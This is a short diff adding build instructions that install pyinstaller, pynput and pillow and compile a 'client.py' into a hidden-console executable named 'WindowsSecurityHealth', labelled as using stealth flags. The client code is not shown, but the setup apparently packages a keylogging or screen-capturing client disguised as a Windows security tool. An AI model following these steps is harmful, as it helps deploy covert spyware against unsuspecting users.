@@ -1,0 +1,7 @@
+# Install requirements
+pip install pyinstaller pynput pillow
+
+# Compile client to single .exe (stealth flags)
+pyinstaller --onefile --noconsole --name "WindowsSecurityHealth" client.py
+
+# Output in: dist/WindowsSecurityHealth.exe
